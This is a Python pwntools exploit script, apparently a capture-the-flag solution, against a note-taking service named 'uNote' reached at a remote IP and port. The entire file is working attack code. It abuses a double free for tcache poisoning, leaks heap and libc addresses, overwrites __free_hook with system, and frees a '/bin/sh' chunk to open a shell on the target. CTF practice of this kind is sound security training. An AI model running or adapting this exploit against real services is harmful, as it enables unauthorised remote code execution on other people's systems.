from pwn import *

# p = process(['./uNote'])
p = remote("103.37.125.56",10005)
libc = ELF('./libc.so.6')

# context.log_level = 'debug'

def add(content):
    p.sendlineafter(b'Keluar\n', b'1')
    p.sendlineafter('> ', content)

def show():
    p.sendlineafter(b'Keluar\n', b'3')

def free():
    p.sendlineafter(b'Keluar\n', b'2')


add('A'*30)

for i in range(4):
    free()

show()

heap_leak = u64(p.recvuntil('\n',drop=True).ljust(8, b'\x00'))
log.info('Heap leak: ' + hex(heap_leak))
# gdb.attach(p)

add(p64(0) + b'A'*8)
add(b'A'*8)

for i in range(8):
    add((p64(heap_leak) + p64(0x91)) * 2)

free()
free()

add(p64(heap_leak + 0x40))

add('B'*8)
add('C'*8)

for i in range(8):
    free()

show()

leak = u64(p.recvuntil('\n',drop=True).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0 # Offset
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

log.info('Libc leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('__free_hook: ' + hex(free_hook))
log.info('system: ' + hex(system))

add('A'*8)
free()
free()

add(p64(free_hook))
add(p64(0))
add(p64(system))

add('/bin/sh\x00')
free()

p.interactive()
